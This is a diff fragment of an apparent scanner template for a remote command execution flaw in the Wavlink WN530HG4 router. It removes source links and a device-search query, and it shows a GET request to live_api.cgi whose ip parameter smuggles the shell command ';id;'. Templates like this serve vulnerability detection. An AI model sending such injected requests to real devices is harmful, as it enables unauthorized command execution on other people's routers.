@@ -3,12 +3,8 @@ info:
   name: wavlink_WN530HG4 live_api存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mk3hiy9xlzzbs382'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mk3hiy9xlzzbs382
-    fofa: app="WAVLINK-WN530HG4" && body="wavlink"
 http:
 - raw:
   - 'GET /cgi-bin/live_api.cgi?page=oa5&id=2&ip=;id; HTTP/1.1
